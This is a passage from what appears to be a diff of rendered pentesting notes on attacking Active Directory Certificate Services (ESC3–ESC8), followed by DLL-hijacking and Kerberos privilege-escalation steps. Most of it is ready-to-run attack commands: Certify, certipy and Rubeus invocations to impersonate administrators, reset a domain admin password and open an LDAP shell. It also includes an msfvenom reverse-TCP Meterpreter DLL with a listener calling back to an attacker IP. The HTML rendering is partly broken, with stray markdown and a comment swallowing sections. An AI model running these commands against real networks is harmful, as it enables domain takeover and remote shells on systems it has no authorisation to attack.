+</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a># 2.5.29.37.0: Any Purpose EKU
+</span><span id="__span-71-3"><a id="__codelineno-71-3" name="__codelineno-71-3" href="#__codelineno-71-3"></a>(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="esc3">ESC3</h2>
+<p>To abuse this for privilege escalation, a CAs requires at least two templates conditions.</p>
+<h3 id="requirements-to-attack-condition-1">Requirements to Attack (Condition 1)</h3>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Value</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Authorized Signature Required</td>
+<td>0</td>
+<td>It's not required.</td>
+</tr>
+<tr>
+<td>pKIExtendedKeyUsage</td>
+<td>Certificate Request Agent EKU</td>
+<td>The Certificate Request Agent OID (<code>1.3.6.1.4.1.311.20.2.1</code>), known as <strong>Enrollment Agent</strong>, allows for requesting other certificate templates on behalf of other principals.</td>
+</tr>
+<tr>
+<td>Enrollment Permissions</td>
+<td>Low-level domain users such as Authenticated Users</td>
+<td>Low-priivileged users can request a certificate with the template.</td>
+</tr>
+<tr>
+<td>Enrollment Agent Restrictions</td>
+<td>Not implemented</td>
+<td></td>
+</tr>
+<tr>
+<td>Manager approval</td>
+<td>Disabled</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h3 id="requirements-to-attack-condition-2">Requirements to Attack (Condition 2)</h3>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Value</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Authorized Signature Required</td>
+<td>1</td>
+<td>It's required.</td>
+</tr>
+<tr>
+<td>Schema Version</td>
+<td><code>1</code> or is greater than <code>2</code></td>
+<td></td>
+</tr>
+<tr>
+<td>Application Policies</td>
+<td>Certificate Request Agent EKU</td>
+<td></td>
+</tr>
+<tr>
+<td>pKIExtendedKeyUsage</td>
+<td>Certificate Request Agent EKU</td>
+<td>Client Authentication</td>
+</tr>
+<tr>
+<td>Enrollment Permissions</td>
+<td>Low-level domain users such as Authenticated Users</td>
+<td>Low-priivileged users can request a certificate with the template.</td>
+</tr>
+<tr>
+<td>Enrollment Agent Restrictions</td>
+<td>Not implemented</td>
+<td></td>
+</tr>
+<tr>
+<td>Manager approval</td>
+<td>Disabled</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h3 id="exploit_2">Exploit</h3>
+<p>We can request an enrollment agent certificate (Condition 1).</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a>Certify.exe request /ca:dc.example.local\VULN-CA /template:VulnTemplate
+</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2" href="#__codelineno-72-2"></a>certipy req &#39;example.local/username:password@ca.example.local -ca &#39;VULN-CA&#39; -template VulnTemplate
+</span></code></pre></div>
+<p>Then issue a certificate request on behalf of another to a template that allows for domain authentication (Condition 2).</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a>Certify.exe request /ca:dc.example.local\VULN-CA /template:User /onbehalfof:example\itadmin /enrollcert:enrollmentAgentCert.pfx /enrollcertpw:asdf
+</span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2" href="#__codelineno-73-2"></a>certipy req &#39;example.local/username:password@ca.example.local&#39; -ca &#39;VULN-CA&#39; -template &#39;User&#39; -on-behalf-of &#39;example\administrator&#39; -pfx &#39;cert.pfx&#39;
+</span></code></pre></div>
+<p>Ask TGT to authenticate as the "On Behalf Of" user.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>Rubeus.exe asktgt /user:example\itadmin /certificate:itadminFromEnrollmentAgent.pfx /password:asdf
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="esc4">ESC4</h2>
+<h3 id="requirements-to-attack_2">Requirements to Attack</h3>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Value</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Access Control rights</td>
+<td>Users have <code>Full Control</code> or <code>Write</code> permission.</td>
+<td></td>
+</tr>
+<tr>
+<td>Object Control Permissions</td>
+<td>Users have <code>Owner</code>, <code>FullControl</code>, <code>WriteOwner</code>, <code>WriteDacl</code> or <code>WriteProperty</code> permission.</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h2 id="esc6">ESC6</h2>
+<h3 id="requirements-to-attack_3">Requirements to Attack</h3>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Value</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>EDITF_ATTRIBUTESUBJECTALTNAME2 flag</td>
+<td>Enabled</td>
+<td>If this flag is set on the CA, any request (including when the subject is built from Active Directory) can have user defined values in the SAN (subject alternative name.)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="exploit_3">Exploit</h3>
+<p>First off, check if the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag is set on the CA.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>certutil –getreg policy\EditFlags
+</span><span id="__span-75-2"><a id="__codelineno-75-2" name="__codelineno-75-2" href="#__codelineno-75-2"></a>
+</span><span id="__span-75-3"><a id="__codelineno-75-3" name="__codelineno-75-3" href="#__codelineno-75-3"></a>reg query \\&lt;target-ip&gt;\HKEY_LOCAL_MACHINE_SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\&lt;VULN-CA&gt;\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
+</span></code></pre></div>
+<p>If set, abuse it by using <code>/altname</code> flag with any template (e.g. <code>User</code>) that allows for domain auth.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a>Certify.exe request /ca:dc.example.local\VULN-CA /template:User /altname:localadmin
+</span><span id="__span-76-2"><a id="__codelineno-76-2" name="__codelineno-76-2" href="#__codelineno-76-2"></a>
+</span><span id="__span-76-3"><a id="__codelineno-76-3" name="__codelineno-76-3" href="#__codelineno-76-3"></a>certutil -config &quot;VULN-CA-HOST\VULN-CA&quot; -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="esc7">ESC7</h2>
+<h3 id="requirements-to-attack_4">Requirements to Attack</h3>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Value</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CA Permissions</td>
+<td>Low-privileged users have <code>ManageCA</code> (aka CA Administrator) permissions or <code>ManageCertificates</code> (aka Certificate Manager/Officer).</td>
+<td>The <code>ManageCA</code> permission grants a principal the ability to perform "Administrative" CA actions, including the modification of persistent configuration data. This includes the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="exploit_4">Exploit</h3>
+<p>At first we need to know the <code>CA Name</code> so run the following command then check the output.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a>certipy find -u username@example.local -p password -dc-ip &lt;target-ip&gt; -stdout
+</span><span id="__span-77-2"><a id="__codelineno-77-2" name="__codelineno-77-2" href="#__codelineno-77-2"></a>
+</span><span id="__span-77-3"><a id="__codelineno-77-3" name="__codelineno-77-3" href="#__codelineno-77-3"></a># Also it can be used.
+</span><span id="__span-77-4"><a id="__codelineno-77-4" name="__codelineno-77-4" href="#__codelineno-77-4"></a>Get-CertificationAuthority -ComputerName dc.example.local | Get-CertificationAuthorityAcl | select -expand Access
+</span></code></pre></div>
+<p>Then add new officer to the CA.  Replace <code>victim-ca</code> with actual name found.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a># -add-officer: Add a new officer to specific CA (specified with `-ca`)
+</span><span id="__span-78-2"><a id="__codelineno-78-2" name="__codelineno-78-2" href="#__codelineno-78-2"></a># -ca: Specify the CA Name
+</span><span id="__span-78-3"><a id="__codelineno-78-3" name="__codelineno-78-3" href="#__codelineno-78-3"></a>certipy ca -u username@example.local -p password -dc-ip &lt;target-ip&gt; -ca &#39;victim-ca&#39; -add-officer username
+</span></code></pre></div>
+<p>Next, enable the template on the CA.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a>certipy ca -u username@example.local -p password -dc-ip &lt;target-ip&gt; -ca &#39;victim-ca&#39; -enable-template &#39;SubCA&#39;
+</span><span id="__span-79-2"><a id="__codelineno-79-2" name="__codelineno-79-2" href="#__codelineno-79-2"></a>
+</span><span id="__span-79-3"><a id="__codelineno-79-3" name="__codelineno-79-3" href="#__codelineno-79-3"></a># Check if the template enabled successfully
+</span><span id="__span-79-4"><a id="__codelineno-79-4" name="__codelineno-79-4" href="#__codelineno-79-4"></a>certipy ca -u username@example.local -p password -dc-ip &lt;target-ip&gt; -ca &#39;victim-ca&#39; -list-template
+</span></code></pre></div>
+<p>Request the certificate for the template such as <code>SubCA</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a># -upn: Alternative UPN
+</span><span id="__span-80-2"><a id="__codelineno-80-2" name="__codelineno-80-2" href="#__codelineno-80-2"></a>certipy req -u username@example.local -p password -dc-ip &lt;target-ip&gt; -ca &#39;victim-ca&#39; -template &#39;SubCA&#39; -upn administrator@example.local -target example.local
+</span></code></pre></div>
+<p>If failed, we can issue the request with the request ID.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a>certipy ca -u username@example.local -p password -dc-ip &lt;target-ip&gt; -ca &#39;victim-ca&#39; -issue-request &lt;request-id&gt;
+</span><span id="__span-81-2"><a id="__codelineno-81-2" name="__codelineno-81-2" href="#__codelineno-81-2"></a>certipy req -u username@example.local -p password -dc-ip &lt;target-ip&gt; -ca &#39;victim-ca&#39; -target example.local -retrieve &lt;request-id&gt;
+</span></code></pre></div>
+<p>Now we have <code>administrator.pfx</code>. Using this, we can retrieve the hash.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a>certipy ca auth -pfx administrator.pfx -dc-ip &lt;target-ip&gt; -domain example.local -username administrator
+</span></code></pre></div>
+<p>Crack the hash and get the administrator’s password or execute pass-the-hash attack.</p>
+<p><br /></p>
+<h2 id="esc8">ESC8</h2>
+<p>AD CS supports several HTTP-based enrollment methods via additional AD CS server roles that administrators can install. These HTTP-based certificate enrollement interfaces are all vulnerable NTLM relay attacks.</p>
+<h3 id="exploit_5">Exploit</h3>
+<p>Enumerate enabled HTTP AD CS endpoints with <code>Certify</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a>Certify.exe cas
+</span></code></pre></div>
+<p>To parse and list the CES endpoints in their AD object in the <code>msPKI-Enrollment-Servers</code>, execute the following command.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a>certutil -enrollmentServerURL -config DC.EXAMPLE.LOCAL\VULN-CA
+</span><span id="__span-84-2"><a id="__codelineno-84-2" name="__codelineno-84-2" href="#__codelineno-84-2"></a>
+</span><span id="__span-84-3"><a id="__codelineno-84-3" name="__codelineno-84-3" href="#__codelineno-84-3"></a>Import-Module PSPKI
+</span><span id="__span-84-4"><a id="__codelineno-84-4" name="__codelineno-84-4" href="#__codelineno-84-4"></a>Get-CertificationAuthority | Select Name,Enroll* | Format-List *
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="privilege-escalation-with-microsoft-management-console-mmc">Privilege Escalation with Microsoft Management Console (MMC)</h2>
+<p>If we find the template which contains vulnerable parameters, we can create a new certificate using the template and can gain access to the Administrator's account.<br />
+There are some method to create the new one. However, this section provides the easiest way using MMC.  </p>
+<ol>
+<li>
+<p>Request a New “Malicious” Certificate with MMC</p>
+</li>
+<li>
+<p>Right-click on the Windows icon, and select Run.</p>
+</li>
+<li>Enter <strong>“mmc”</strong> (Microsoft Management Console)* in the form and click OK. The console window opens.</li>
+<li>In the MMC window, click <strong>File → Add/Remote Snap-in.</strong>.</li>
+<li>Add the <strong>“Certificates”</strong> snap-in in the window then click OK.</li>
+<li>Expand the Certificates in the left pane.</li>
+<li>Right-click on the Personal and select <strong>All Tasks → Request New Certificate</strong>.</li>
+<li>The Certificate Enrollment window, click Next twice.</li>
+<li>In Request Certificates section, click the <strong>“More information is required to enroll…”</strong>.</li>
+<li>
+<p>In Certificate Properties window, choose types and enter values in the form.</p>
+<p>Subject name:</p>
+<ul>
+<li>Type: Common name</li>
+<li>Value: <strong>vulncert</strong> (specify an arbitrary name)</li>
+</ul>
+<p>Alternative name:</p>
+<ul>
+<li>Type: User principal name</li>
+<li>Value: <strong>tester@abc.example.com</strong>  (specify the impersonated name and the target domain)</li>
+</ul>
+</li>
+<li>
+<p>Add each name and click OK.</p>
+</li>
+<li>Return to the Request Certificates section. Check on the certificate we want to request, then click Enroll.</li>
+<li>After finishing, expand <strong>Personal → Certificates</strong>. We should see the new certificate is added.</li>
+<li>Double-click on the certificate. The Certificate window opens.</li>
+<li>In the Certificate window, select <strong>Details</strong> tab and choose <strong>Subject Alternative Name</strong>. We should see the principal name is our specified name e.g. tester@abc.example.com. If we can, click OK to close the window.</li>
+<li>At the end, in the MMC window, right-click on the new certificate which we created and select <strong>All Tasks   → Export…</strong> to export the certificate. The Certificate Export Wizard opens.</li>
+<li>In Export Private Key section, select <strong>“Yes, export the private key”</strong> and click Next.</li>
+<li>In Export File Format, it is usually okey the default .PFX format so click Next without any changes.</li>
+<li>In Security section, check the Password and enter new password.</li>
+<li>In File to Export section, enter the file name and Next.</li>
+<li>
+<p>Finally click Finish then we could export the new malicious certificate.</p>
+</li>
+<li>
+<p>Impersonate User using the Malicious Certificate</p>
+</li>
+</ol>
+<p>If we create a new certificate, we can use it to impersonate the privileged user.</p>
+<ol>
+<li>
+<p><strong>Request Kerberos TGT (Ticket Granting Ticket).</strong></p>
+<p><strong><a href="https://github.com/GhostPack/Rubeus">Rubeus.exe</a></strong> is useful to do for that. For details, see <a href="/exploit/windows/active-directory/kerberos-pentesting/#privilege-escalation-with-kerberos">Privilege Escalation with Kerberos</a>.</p>
+</li>
+</ol>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a>    Rubeus.exe asktgt /user:tester /enctype:aes256 /certificate:vulncert.pfx /password:password /outfile:tester.kirbi /domain:labc.example.com /dc:&lt;ip_of_the_domain_controller&gt;
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code>After that, we should get the TGT (.kirbi file).  
+We can gain access using the TGT by changing the password of the DA account.
+</code></pre></div>
+<ol>
+<li><strong>Change the Password of the DA (Domain Administrator) Account.</strong></li>
+</ol>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a>    # changepw: Change the password of the target user
+</span><span id="__span-86-2"><a id="__codelineno-86-2" name="__codelineno-86-2" href="#__codelineno-86-2"></a>    # /ticket: Specify the TGT file (.kirbi) we&#39;ve generated
+</span><span id="__span-86-3"><a id="__codelineno-86-3" name="__codelineno-86-3" href="#__codelineno-86-3"></a>    # /new: New password for impersonated user
+</span><span id="__span-86-4"><a id="__codelineno-86-4" name="__codelineno-86-4" href="#__codelineno-86-4"></a>    # /targetuser: Specify the Domain Administrator account name
+</span><span id="__span-86-5"><a id="__codelineno-86-5" name="__codelineno-86-5" href="#__codelineno-86-5"></a>    Rubeus.exe changepw /ticket:tester.kirbi /new:newpass /dc:&lt;ip_of_the_domain_controller&gt; /targetuser:abc.example.com\&lt;da_user_name&gt;
+</span></code></pre></div>
+<ol>
+<li>
+<p><strong>Get the Administrator’s Shell</strong></p>
+<p>Using <strong>runas</strong> command, we can gain access to the Administrator’s account.<br />
+Use the new password which we’ve given the previous section in prompt.</p>
+</li>
+</ol>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a>    runas /user:abc.example.com\&lt;da_user_name&gt; cmd.exe
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="add-computer-and-privesc">Add Computer and PrivEsc</h2>
+<h3 id="1-add-computer-to-the-domain">1. Add Computer to the Domain</h3>
+<p>We can use the <strong>addcomputer (<a href="https://github.com/SecureAuthCorp/impacket">impacket</a>)</strong> which is usually used for AD CS (Active Directory Certificate Services) Privilege Escalation.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a>impacket-addcomputer &#39;example.local/username:password&#39; -method LDAPS -computer-name &#39;TEST$&#39; -computer-pass &#39;password&#39;
+</span><span id="__span-88-2"><a id="__codelineno-88-2" name="__codelineno-88-2" href="#__codelineno-88-2"></a># or
+</span><span id="__span-88-3"><a id="__codelineno-88-3" name="__codelineno-88-3" href="#__codelineno-88-3"></a>impacket-addcomputer &#39;example.local/username:password&#39; -dc-ip 10.0.0.1 -method LDAPS -computer-name &#39;TEST$&#39; -computer-pass &#39;password&#39;
+</span><span id="__span-88-4"><a id="__codelineno-88-4" name="__codelineno-88-4" href="#__codelineno-88-4"></a># or
+</span><span id="__span-88-5"><a id="__codelineno-88-5" name="__codelineno-88-5" href="#__codelineno-88-5"></a>impacket-addcomputer &#39;example.local/username:password@example.com&#39; -method LDAPS -computer-name &#39;TEST$&#39; -computer-pass &#39;password&#39;
+</span></code></pre></div>
+<h3 id="3-request-certificates">3. Request Certificates</h3>
+<p>After adding new computer, we might be able to retrieve certificate using this computer account.<br />
+At this time, try using alternate UPN (<strong><code>-upn</code></strong>) for administrator because we want to escalate privilege.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a>certipy req -u &#39;TEST$&#39; -p &#39;password&#39; -ca VULN-CA -target example.local -dc-ip 10.0.0.1 -dns ca.example.local -template Example -upn Administrator@example.local
+</span></code></pre></div>
+<p>If successful, the file which contains certificates and private key (e.g. <strong><code>administrator.pfx</code></strong>) will be saved in current directory.  </p>
+<h3 id="4-authenticate-using-pfx">4. Authenticate using PFX</h3>
+<p>We might be able to retrieve TGT using the <strong><code>.pfx</code></strong> file as below.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a># From outside of target machine
+</span><span id="__span-90-2"><a id="__codelineno-90-2" name="__codelineno-90-2" href="#__codelineno-90-2"></a>certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
+</span><span id="__span-90-3"><a id="__codelineno-90-3" name="__codelineno-90-3" href="#__codelineno-90-3"></a># From inside of target machine
+</span><span id="__span-90-4"><a id="__codelineno-90-4" name="__codelineno-90-4" href="#__codelineno-90-4"></a>Rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /ptt
+</span></code></pre></div>
+<p>Then using/cracking it to authenticate as Administrator.</p>
+<h3 id="option-authenticate-over-ldap">Option: Authenticate over LDAP</h3>
+<p>Reference: <a href="https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html">https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html</a></p>
+<p>According to the article above, we may be able to authenticate over some protocols such as LDAP(S).
+First off, split the <strong><code>administrator.pfx</code></strong> with <strong>certificate</strong> and <strong>private key</strong> using two commands below.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a># Extract certificate by `-nokey` flag
+</span><span id="__span-91-2"><a id="__codelineno-91-2" name="__codelineno-91-2" href="#__codelineno-91-2"></a>certipy cert -pfx administrator.pfx -nokey -out cert.crt
+</span><span id="__span-91-3"><a id="__codelineno-91-3" name="__codelineno-91-3" href="#__codelineno-91-3"></a>
+</span><span id="__span-91-4"><a id="__codelineno-91-4" name="__codelineno-91-4" href="#__codelineno-91-4"></a># Extract private key by `-nocert` flag
+</span><span id="__span-91-5"><a id="__codelineno-91-5" name="__codelineno-91-5" href="#__codelineno-91-5"></a>certipy cert -pfx administrator.pfx -nocert -out cert.key
+</span></code></pre></div>
+<p>After that, using <a href="https://github.com/AlmondOffSec/PassTheCert">PassTheCert</a>, we can spawn shell as Administrator via <strong>Schannel</strong> against <strong>LDAP(S)</strong>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a>python3 passthecert.py -dc-ip 10.0.0.1 -crt cert.crt -key cert.key -domain example.local -port 636 -action ldap-shell
+</span></code></pre></div>
+<p><br /></p>
+<p>&lt;!-- ### 1. Request a New "Malicious" Certificate</p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a># User Template
+</span><span id="__span-93-2"><a id="__codelineno-93-2" name="__codelineno-93-2" href="#__codelineno-93-2"></a>certipy req &#39;vuln.local/username:password@vuln.com&#39; -ca VULN-CA  -template User
+</span><span id="__span-93-3"><a id="__codelineno-93-3" name="__codelineno-93-3" href="#__codelineno-93-3"></a># Machine Template
+</span><span id="__span-93-4"><a id="__codelineno-93-4" name="__codelineno-93-4" href="#__codelineno-93-4"></a>certipy req &#39;vuln.local/machine-name:machine-password@vuln.com&#39; -ca VULN-CA -template Machine
+</span><span id="__span-93-5"><a id="__codelineno-93-5" name="__codelineno-93-5" href="#__codelineno-93-5"></a>
+</span><span id="__span-93-6"><a id="__codelineno-93-6" name="__codelineno-93-6" href="#__codelineno-93-6"></a># After requesting it, use the output credential when authenticating
+</span><span id="__span-93-7"><a id="__codelineno-93-7" name="__codelineno-93-7" href="#__codelineno-93-7"></a>certipy auth -pfx user.pfx
+</span><span id="__span-93-8"><a id="__codelineno-93-8" name="__codelineno-93-8" href="#__codelineno-93-8"></a>certipy auth -pfx machine.pfx
+</span><span id="__span-93-9"><a id="__codelineno-93-9" name="__codelineno-93-9" href="#__codelineno-93-9"></a>``` --&gt;
+</span><span id="__span-93-10"><a id="__codelineno-93-10" name="__codelineno-93-10" href="#__codelineno-93-10"></a>
+</span><span id="__span-93-11"><a id="__codelineno-93-11" name="__codelineno-93-11" href="#__codelineno-93-11"></a>
+</span><span id="__span-93-12"><a id="__codelineno-93-12" name="__codelineno-93-12" href="#__codelineno-93-12"></a># Windows PrivEsc with DLL Hijacking
+</span><span id="__span-93-13"><a id="__codelineno-93-13" name="__codelineno-93-13" href="#__codelineno-93-13"></a>
+</span><span id="__span-93-14"><a id="__codelineno-93-14" name="__codelineno-93-14" href="#__codelineno-93-14"></a>If we found running services using netstat or Get-Process, identify the executable that service is running and reversing the file. If the executable loads some DLL, we can overwrite the DLL to execute arbitrary code. 
+</span><span id="__span-93-15"><a id="__codelineno-93-15" name="__codelineno-93-15" href="#__codelineno-93-15"></a>
+</span><span id="__span-93-16"><a id="__codelineno-93-16" name="__codelineno-93-16" href="#__codelineno-93-16"></a>
+</span><span id="__span-93-17"><a id="__codelineno-93-17" name="__codelineno-93-17" href="#__codelineno-93-17"></a>## Exploit
+</span><span id="__span-93-18"><a id="__codelineno-93-18" name="__codelineno-93-18" href="#__codelineno-93-18"></a>### 1. Enumerate Services (Processes)
+</span><span id="__span-93-19"><a id="__codelineno-93-19" name="__codelineno-93-19" href="#__codelineno-93-19"></a>
+</span><span id="__span-93-20"><a id="__codelineno-93-20" name="__codelineno-93-20" href="#__codelineno-93-20"></a>At first, list running processes and find interesting ones.
+</span></code></pre></div>
+tasklist
+Get-Process
+ps
+<div class="language-text highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a>### 2. Identify the Service
+</span></code></pre></div>
+sc qc "example-service"
+<div class="language-text highlight"><pre><span></span><code><span id="__span-95-1"><a id="__codelineno-95-1" name="__codelineno-95-1" href="#__codelineno-95-1"></a>With the command above, we can see the path of the executable which runs the process.  
+</span><span id="__span-95-2"><a id="__codelineno-95-2" name="__codelineno-95-2" href="#__codelineno-95-2"></a>To see what DLLs are loaded on the executable, disassemble/decompile it with `strings` command, `WinDbg`, `x64dbg`, or online tools such as `Decompiler Explorer`.
+</span><span id="__span-95-3"><a id="__codelineno-95-3" name="__codelineno-95-3" href="#__codelineno-95-3"></a>
+</span><span id="__span-95-4"><a id="__codelineno-95-4" name="__codelineno-95-4" href="#__codelineno-95-4"></a>### 3. Check Write Permission of DLL
+</span><span id="__span-95-5"><a id="__codelineno-95-5" name="__codelineno-95-5" href="#__codelineno-95-5"></a>
+</span><span id="__span-95-6"><a id="__codelineno-95-6" name="__codelineno-95-6" href="#__codelineno-95-6"></a>Find the DLL file on target machine, then check if we have write permission for the file.
+</span></code></pre></div>
+icacls \path\to\example.dll
+<div class="language-text highlight"><pre><span></span><code><span id="__span-96-1"><a id="__codelineno-96-1" name="__codelineno-96-1" href="#__codelineno-96-1"></a>### 4. Create Malicious DLL
+</span><span id="__span-96-2"><a id="__codelineno-96-2" name="__codelineno-96-2" href="#__codelineno-96-2"></a>
+</span><span id="__span-96-3"><a id="__codelineno-96-3" name="__codelineno-96-3" href="#__codelineno-96-3"></a>If we have write permission, we can override the `.dll` file.  
+</span><span id="__span-96-4"><a id="__codelineno-96-4" name="__codelineno-96-4" href="#__codelineno-96-4"></a>So create a malicious DLL using `msfvenom` in local machine:
+</span></code></pre></div></p>
+<h1 id="replace-10001-with-your-local-ip">Replace 10.0.0.1 with your local ip</h1>
+<p>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f dll -o evil.dll
+<div class="language-text highlight"><pre><span></span><code><span id="__span-97-1"><a id="__codelineno-97-1" name="__codelineno-97-1" href="#__codelineno-97-1"></a>After generating our `evil.dll`, replace the original DLL with this on target machine:
+</span></code></pre></div>
+cp evil.dll \path\to\example.dll
+<div class="language-text highlight"><pre><span></span><code><span id="__span-98-1"><a id="__codelineno-98-1" name="__codelineno-98-1" href="#__codelineno-98-1"></a>Now start a TCP listener in local machine.
+</span></code></pre></div>
+msfconsole
+msf&gt; use exploit/multi/handler
+msf&gt; set payload windows/x64/meterpreter/reverse_tcp</p>
+<h1 id="replace-10001-with-your-ip">Replace 10.0.0.1 with your ip</h1>
+<p>msf&gt; set lhost 10.0.0.1
+msf&gt; set lport 4444
+msf&gt; run
+<div class="language-text highlight"><pre><span></span><code><span id="__span-99-1"><a id="__codelineno-99-1" name="__codelineno-99-1" href="#__codelineno-99-1"></a>When the service runs, our malicious DLL is loaded and the payload is executed.  
+</span><span id="__span-99-2"><a id="__codelineno-99-2" name="__codelineno-99-2" href="#__codelineno-99-2"></a>We may get a shell.
+</span><span id="__span-99-3"><a id="__codelineno-99-3" name="__codelineno-99-3" href="#__codelineno-99-3"></a>
+</span><span id="__span-99-4"><a id="__codelineno-99-4" name="__codelineno-99-4" href="#__codelineno-99-4"></a>
+</span><span id="__span-99-5"><a id="__codelineno-99-5" name="__codelineno-99-5" href="#__codelineno-99-5"></a># Windows PrivEsc with Kerberos
+</span><span id="__span-99-6"><a id="__codelineno-99-6" name="__codelineno-99-6" href="#__codelineno-99-6"></a>## Privilege Escalation
+</span><span id="__span-99-7"><a id="__codelineno-99-7" name="__codelineno-99-7" href="#__codelineno-99-7"></a>
+</span><span id="__span-99-8"><a id="__codelineno-99-8" name="__codelineno-99-8" href="#__codelineno-99-8"></a>First off, download two PS scripts in local machine..
+</span></code></pre></div>
+wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1
+<div class="language-text highlight"><pre><span></span><code><span id="__span-100-1"><a id="__codelineno-100-1" name="__codelineno-100-1" href="#__codelineno-100-1"></a>Then upload them to the target machine.
+</span></code></pre></div></p>
+<h1 id="evil-winrm">Evil-WinRM</h1>
+<p>upload PowerView.ps1
+Import-Module .\PowerView.ps1
+upload Powermad.ps1
+Import-Module .\Powermad.ps1
+<div class="language-text highlight"><pre><span></span><code><span id="__span-101-1"><a id="__codelineno-101-1" name="__codelineno-101-1" href="#__codelineno-101-1"></a>### 1. Check User&#39;s Permission and Windows Versions
